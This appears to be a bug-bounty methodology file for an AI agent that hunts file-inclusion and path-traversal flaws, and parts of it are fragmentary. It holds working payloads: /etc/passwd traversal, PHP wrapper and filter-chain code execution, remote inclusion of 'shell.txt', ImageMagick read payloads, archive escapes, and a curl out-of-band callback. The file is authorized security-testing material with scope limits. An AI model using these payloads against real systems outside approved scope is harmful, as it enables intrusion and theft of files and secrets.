# HUNT-LFI: Local / Remote File Inclusion & Path Traversal
- **PHP filter-chain → RCE**; the modern default. A PHP include/require sink that permits suitable filter chains may reach code execution with **no upload endpoint and no writable file** by chaining `iconv` conversions to forge an arbitrary PHP payload in-memory (Synacktiv, 2022). See the dedicated section below. A read-only API such as file_get_contents does not execute generated PHP.
- **Log poisoning → RCE**; inject PHP into an Apache/Nginx log (User-Agent / URL path), then include the log. Increasingly blocked by `open_basedir` and unreadable log perms, so verify the log is *readable* first.
- **PHP wrappers → source disclosure**; `php://filter/convert.base64-encode/resource=index.php` leaks source; read source to find more LFI sinks, secrets, and the include base path.
- **RFI → RCE**; when `allow_url_include=On`, `?file=http://OOB/shell.txt` pulls and executes remote code. Rare on modern configs but trivially Critical when present.
- **phar:// deserialization**; a crafted PHAR + any unserialize-on-metadata sink → object-injection RCE.
1. Pick a **unique marker** target: prefer an owner-created non-sensitive canary file outside the permitted subtree, with a marker not included in the request. For blind, use a php://filter base64 read and decode; strictly decode complete base64 groups and report recovered bytes only; truncated base64 may not decode to recognizable source.
### Phase 1: Identify Candidates
### Phase 2: Path Traversal (read)
?file=/etc/passwd%00.png                      # null byte; PHP < 5.3.4 only
### Phase 3: PHP Wrappers (source disclosure)
### Phase 4: PHP Filter-Chain → RCE (no upload, no writable file)
The modern flagship technique (Synacktiv, 2022). A php://-capable read alone does not execute PHP. Execution requires an include/require evaluation sink plus available filters/conversions and compatible input limits. `iconv` charset conversions, chained inside `php://filter`, emit controlled bytes that prepend to the resource until a full `<?php ... ?>` payload is forged; then `include()` runs it. **No upload endpoint, no log access, no writable path required.**
# Generate the chain (public tool, no CVE: it abuses documented iconv behaviour):
### Phase 5: Code-Execution Wrappers (config prerequisites)
# data://: executes inline; REQUIRES allow_url_include=On
# php://input: body is treated as the included resource; ALSO REQUIRES allow_url_include=On
# expect://: direct command exec; requires the (rare) expect extension loaded
### Phase 6: Remote File Inclusion (RFI)
### Phase 7: Log Poisoning → RCE
# Step 2: include it (verify the log is readable first: read it plain before poisoning)
### Phase 8: Session / Upload Poisoning
# zip://: archive containing the target, or a symlink to /etc/passwd
### Phase 8b: Archive-extraction & image-processing sinks (no `?file=` needed)
- **Zip Slip / tar-symlink escape**; a server that untars/unzips a user-supplied archive follows `../../` entry names or embedded symlinks (tar preserves them) to read/write outside the extraction dir. Craft an archive entry named `../approved-lab-parent/canary.txt`, or a lab symlink to an owner-created canary; any write test must stay inside an explicitly approved disposable parent directory. Disclosed: reports/1439593, reports/733072, reports/822262.
- **ImageMagick coder read-sink**; image convert/thumbnail/avatar features read local files via MSL/MVG coders even with no file parameter: filename/label `label:@/etc/passwd`, or an MSL payload (`<image xlink:href="msl:/etc/passwd">`) plus `msl:`/`ephemeral:` pseudo-protocols (ImageTragick CVE-2016-3714 family). Disclosed: reports/1858574. Pairs with `hunt-file-upload`.
### Phase 9: Automation (then manual-confirm everything)
- **PHP filter-chain to RCE**; Synacktiv research (2022); `php_filter_chain_generator`. Not a CVE; an abuse of documented `iconv` behaviour. Not proof that an arbitrary file-read sink executes code.
- **CVE-2021-41773**; Apache HTTP Server 2.4.49 path traversal (`%2e` in normalized path) → file read, and RCE when `mod_cgi` is enabled.
- **CVE-2021-42013**; Apache HTTP Server 2.4.50 incomplete fix for the above (double-encoded `%%32%65`) → traversal/RCE.
- **CVE-2024-4577**; PHP-CGI argument injection on Windows (Best-Fit encoding); reachable on XAMPP-style stacks, chains from file-serve to RCE.
> Grounding note: this skill is built from 31 disclosed LFI/path-traversal reports. When citing a specific HackerOne report in your write-up, link the exact report URL/ID you used; do **not** paraphrase a report ID from memory. A wrong ID is worse than none.
| Remote URL include | RFI (`allow_url_include`) | direct RCE; **Critical** |
| File read + upload | phar:// / log / session poison | RCE; **Critical** |
- Show real *contents*, not your echoed path. A controlled canary must contain its expected marker; passwd layouts vary across systems. Diff the response against a known-good param value; the delta must be the file body, not a WAF/error page.
- Rule out reflection: confirm the marker text is not simply your input bounced back. Request `/etc/passwd` and `/etc/passwd_<rand>` (non-existent); only the real file returns content.
**RCE proof:** show command output you control; `id` / `whoami` / `hostname` reflected, or an OOB callback from inside the executed payload (`curl http://<collab>/`). "The payload was accepted" is not RCE.
- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.